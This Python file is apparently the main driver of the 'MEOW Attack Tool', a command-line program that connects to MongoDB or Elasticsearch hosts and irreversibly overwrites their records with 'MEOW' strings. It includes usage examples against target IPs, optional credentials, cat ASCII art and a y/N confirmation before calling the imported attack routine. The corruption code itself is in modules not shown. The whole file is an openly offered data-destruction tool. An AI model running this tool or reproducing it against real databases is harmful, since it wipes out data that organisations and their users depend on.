#!/usr/bin/env python3
import argparse
import sys
import logging
import traceback
import random
# Explicitly import attackers to ensure registration happens
import attackers
from core.attack_factory import AttackFactory
from utils.logging import setup_logging

def parse_arguments():
    """
    Parse command line arguments.
    """
    parser = argparse.ArgumentParser(
        description='MEOW Attack Tool - Corrupts data in database services with "MEOW" attacks',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  List supported services:
    python meow_attack_tool.py -l
    
  Attack MongoDB with default settings:
    python meow_attack_tool.py -t 192.168.1.11 -s mongodb
    
  Attack Elasticsearch with authentication and custom port:
    python meow_attack_tool.py -t 192.168.1.12 -s elasticsearch -p 9201 -u admin -pw secret
        """
    )
    
    parser.add_argument('-l', '--list', action='store_true', 
                        help='List supported database services')
    parser.add_argument('-t', '--target', type=str,
                        help='Target host IP address')
    parser.add_argument('-s', '--service', type=str,
                        help='Database service to attack (e.g., mongodb, elasticsearch)')
    parser.add_argument('-p', '--port', type=int,
                        help='Port number (if not default)')
    parser.add_argument('-u', '--username', type=str,
                        help='Username for authentication')
    parser.add_argument('-pw', '--password', type=str,
                        help='Password for authentication')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output')
    
    return parser.parse_args()

def show_cat_art():
    """Display a cute cat ASCII art."""
    cat_arts = [
        r"""
        ╔══════════════════════════════════════════════════════╗
        ║                                                      ║
        ║        ███╗   ███╗███████╗ ██████╗ ██╗    ██╗        ║
        ║        ████╗ ████║██╔════╝██╔═══██╗██║    ██║        ║
        ║        ██╔████╔██║█████╗  ██║   ██║██║ █╗ ██║        ║
        ║        ██║╚██╔╝██║██╔══╝  ██║   ██║██║███╗██║        ║
        ║        ██║ ╚═╝ ██║███████╗╚██████╔╝╚███╔███╔╝        ║
        ║        ╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚══╝╚══╝         ║
        ║                                                      ║
        ║     /\_____/\     MEOW Attack Tool     /\_____/\     ║
        ║    /  o   o  \                        /  o   o  \    ║
        ║   ( ==  ^  == )                      ( ==  ^  == )   ║
        ║    )         (                        )         (    ║
        ║   (           )    By Karl Biron     (           )   ║
        ║  ( (  )   (  ) )                    ( (  )   (  ) )  ║
        ║ (__(__)___(__)__)                  (__(__)___(__)__) ║
        ║                                                      ║
        ╚══════════════════════════════════════════════════════╝
        """,
        r"""
         _________ ____ ____ ____ ____ 
        ||       |||M |||E |||O |||W ||
        ||_______|||__|||__|||__|||__||
        |/_______\|/__\|/__\|/__\|/__\|
         ____ ____ ____ ____ ____ ____ 
        ||A |||T |||T |||A |||C |||K ||
        ||__|||__|||__|||__|||__|||__||
        |/__\|/__\|/__\|/__\|/__\|/__\|
         ____ ____ ____ ____ _________ 
        ||T |||O |||O |||L |||  By   ||
        ||__|||__|||__|||__|||__K.B__||
        |/__\|/__\|/__\|/__\|/_______\|
        """,
        r"""
        ==============================================
          M E O W   A T T A C K   T O O L  >^..^<
        ==============================================
                _______ _______  _____  _  _  _
                |  |  | |______ |     | |  |  |
                |  |  | |______ |_____| |__|__|
                                   
          "Shredding your databases, one paw at a time"
          ~ By Karl Biron ~
        ==============================================
        """,
        r"""
        ╔══════════════════════════════════════════╗
        ║    /\_/\    MEOW ATTACK TOOL   /\_/\     ║
        ║   ( o.o )                     ( o.o )    ║
        ║    > ^ <     By Karl Biron     > ^ <     ║
        ╠══════════════════════════════════════════╣
        ║         _      ____  ___   _             ║
        ║        | |\/| | |_  / / \ \ \    /       ║
        ║        |_|  | |_|__ \_\_/  \_\/\/        ║
        ║                                          ║
        ╚══════════════════════════════════════════╝
        """
    ]
    return random.choice(cat_arts)

def main():
    """
    Main entry point for the MEOW Attack Tool.
    """
    print(show_cat_art())
    args = parse_arguments()
    
    # Debug print to verify registrations
    if args.verbose:
        print(f"Registered attackers: {AttackFactory._registered_attackers}")
    
    # Set up logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logger = setup_logging(log_level)
    
    try:
        # List supported services
        if args.list:
            supported_services = AttackFactory.list_supported_services()
            print("\nSupported database services:")
            if not supported_services:
                print("  No services registered! Check installation.")
            else:
                for i, service in enumerate(supported_services, 1):
                    print(f"  {i}. {service}")
            print()
            return 0
        
        # Validate required arguments
        if not args.target:
            print("Error: Target host (-t) is required")
            return 1
            
        if not args.service:
            print("Error: Database service (-s) is required")
            return 1
        
        # Create appropriate attacker
        attacker = AttackFactory.create_attacker(
            args.service, 
            args.target, 
            args.port, 
            args.username, 
            args.password
        )
        
        print(f"\n[+] Starting MEOW attack on {args.service} at {args.target}")
        print("[+] This will corrupt data by replacing values with 'MEOW' strings")
        
        # Confirm before proceeding
        confirm = input("\n[?] Are you sure you want to continue? This operation cannot be undone [y/N]: ")
        if confirm.lower() not in ('y', 'yes'):
            print("\n[!] Attack aborted by user")
            return 0
        
        # Execute the attack
        print("\n[+] Executing MEOW attack...")
        stats = attacker.execute_attack()
        
        # Display results
        print("\n[+] Attack completed successfully!")
        print(f"[+] Databases processed: {stats['databases_processed']}")
        print(f"[+] Collections processed: {stats['collections_processed']}")
        print(f"[+] Records affected: {stats['records_affected']}")
        print("\n[+] All data has been MEOWed! ᓚᘏᗢ")
        
        return 0
        
    except ValueError as e:
        print(f"\nError: {str(e)}")
        return 1
        
    except Exception as e:
        print(f"\nError: An unexpected error occurred: {str(e)}")
        if args.verbose:
            traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())